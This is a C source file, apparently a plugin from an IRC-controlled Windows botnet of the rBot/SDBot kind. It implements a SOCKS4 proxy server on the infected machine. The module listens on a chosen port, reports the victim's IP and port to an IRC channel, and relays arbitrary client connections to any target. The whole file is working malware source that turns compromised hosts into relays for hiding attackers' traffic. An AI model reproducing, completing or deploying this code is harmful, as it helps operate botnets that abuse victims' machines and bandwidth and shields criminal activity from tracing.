#include "../../headers/includes.h"
#include "../../headers/functions.h"
#include "../../headers/externs.h"

#ifndef NO_SOCK4SERV

DWORD WINAPI Socks4Thread(LPVOID param)
{
	char sendbuf[IRCLINE];

	SOCKADDR_IN ssin, csin;
	SOCKET ssock, csock;
	DWORD lpThreadId;

	int csin_len = sizeof(csin);

	SOCKS4 socks4 = *((SOCKS4 *)param);
	SOCKS4 *socks4p = (SOCKS4 *)param;
	socks4p->gotinfo = TRUE;

	memset(&ssin,0,sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)socks4.port);
	ssin.sin_addr.s_addr = INADDR_ANY;

	ssock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	threads[socks4.threadnum].sock=ssock;

	if (fbind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin)) == 0) {
		if (flisten(ssock, 10) == 0) {
			sprintf(sendbuf, "s[I] (socks.plg) »»  Server started on: %s:%d.", GetIP(socks4.sock), socks4.port);
			if (!socks4.silent) irc_privmsg(socks4.sock, socks4.chan, sendbuf, socks4.notice);
			addlog(sendbuf);

			while (1) {
				csock = faccept(ssock, (LPSOCKADDR)&csin, &csin_len);
				socks4.cgotinfo = FALSE;
				sprintf(sendbuf,"s[I] (socks.plg) »»  Client connection from IP: %s:%d, Server thread: %d.", finet_ntoa(csin.sin_addr), csin.sin_port, socks4.threadnum);
				socks4.cthreadnum = addthread(sendbuf,SOCKS4_THREAD,csock);
				threads[socks4.cthreadnum].parent = socks4.threadnum;
				if (threads[socks4.cthreadnum].tHandle = CreateThread(NULL, 0, &Socks4ClientThread, (LPVOID)&socks4, 0, &lpThreadId)) {
					while (socks4.cgotinfo == FALSE)
						Sleep(5);
				} else
					sprintf(sendbuf, "s[I] (socks.plg) »»  Failed to start client thread, error: <%d>.", GetLastError());
				addlog(sendbuf);
			}
		}
	}
	fclosesocket(ssock);

	sprintf(sendbuf, "s[I] (socks.plg) »»  Failed to start server on Port %d.", socks4.port);
	if (!socks4.silent) irc_privmsg(socks4.sock, socks4.chan, sendbuf, socks4.notice);
	addlog(sendbuf);

	clearthread(socks4.threadnum);

	ExitThread(0);
}

DWORD WINAPI Socks4ClientThread(LPVOID param)
{
	SOCKS4 socks4 = *((SOCKS4 *)param);
	SOCKS4 *socks4p = (SOCKS4 *)param;
	socks4p->cgotinfo = TRUE;

	int threadnum = socks4.cthreadnum;

	SOCKS4HEADER hdr;

	TIMEVAL timeout;
	timeout.tv_sec = 5;
	timeout.tv_usec = 0;
	fd_set fd;
	FD_ZERO(&fd);
	FD_SET(threads[threadnum].sock, &fd);

	if (fselect(0, &fd, NULL, NULL, &timeout) == 0) {
		fclosesocket(threads[threadnum].sock);
		clearthread(threadnum);
		ExitThread(0);
	}
	if (frecv(threads[threadnum].sock, (char *)&hdr, sizeof(hdr), 0) <= 0) {
		fclosesocket(threads[threadnum].sock);
		clearthread(threadnum);
		ExitThread(0);
	}
	if (hdr.vn != 4 || hdr.cd != SOCKS4_CONNECT) {
		fclosesocket(threads[threadnum].sock);
		clearthread(threadnum);
		ExitThread(0);
	}

	// FIX ME: do a userid (hdr.userid) check here if you wish to use simple auth (needs testing)
	if (socks4.userid[0] != '\0') {
		if (strcmp(hdr.userid, socks4.userid) != 0) {
			addlogv("s[I] (socks.plg) »»  Authentication failed. Remote userid: %s != %s.", hdr.userid, socks4.userid);

			hdr.vn = 0;
			hdr.cd = SOCKS4_REJECT_USERID;
			memset(&hdr.userid, 0, 1024);
			fsend(threads[threadnum].sock, (char *)&hdr, 8, 0);

			fclosesocket(threads[threadnum].sock);
			clearthread(threadnum);

			ExitThread(0);
		}
	}

	SOCKADDR_IN tsin;
	memset(&tsin, 0, sizeof(tsin));
	tsin.sin_family = AF_INET;
	tsin.sin_port = hdr.destport;
	tsin.sin_addr.s_addr = hdr.destaddr;

	SOCKET tsock;
	if ((tsock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
		addlogv("s[I] (socks.plg) »»  Error: Failed to open socket(), returned: <%d>.", fWSAGetLastError());

		hdr.vn = 0;
		hdr.cd = SOCKS4_REJECT;
		memset(&hdr.userid, 0, 1024);
		fsend(threads[threadnum].sock, (char *)&hdr, 8, 0);

		fclosesocket(threads[threadnum].sock);
		clearthread(threadnum);

		ExitThread(0);
	}

	if (fconnect(tsock, (LPSOCKADDR)&tsin, sizeof(tsin)) == SOCKET_ERROR) {
		addlogv("s[I] (socks.plg) »»  Error: Failed to connect to target, returned: <%d>.", fWSAGetLastError());

		hdr.vn = 0;
		hdr.cd = SOCKS4_REJECT;
		memset(&hdr.userid, 0, 1024);
		fsend(threads[threadnum].sock, (char *)&hdr, 8, 0);

		fclosesocket(threads[threadnum].sock);
		clearthread(threadnum);

		ExitThread(0);
	}

	hdr.vn = 0;
	hdr.cd = SOCKS4_GRANT;
	memset(&hdr.userid, 0, 1024);
	fsend(threads[threadnum].sock, (char *)&hdr, 8, 0);
	TransferLoop(tsock, threads[threadnum].sock);

	fclosesocket(tsock);
	fclosesocket(threads[threadnum].sock);
	clearthread(threadnum);

	ExitThread(0);
}

void TransferLoop(SOCKET tsock, SOCKET csock)
{
	int len;
	char buf[1024];
	fd_set fd;

	while (TRUE) {
		FD_ZERO(&fd);
		FD_SET(csock, &fd);
		FD_SET(tsock, &fd);

		memset(buf, 0, sizeof(buf));
		fselect(0, &fd, NULL, NULL, NULL);

		if(fFD_ISSET(csock, &fd)) {
			if((len = frecv(csock,buf,sizeof(buf),0))== -1) break;
			if(fsend(tsock,buf,len,0)== -1) break;
		}
	    if (fFD_ISSET(tsock,&fd)) {
			if((len = frecv(tsock,buf,sizeof(buf),0))== -1) break;
			if(fsend(csock,buf,len,0)== -1) break;
		}
	}

	return;
}
#endif
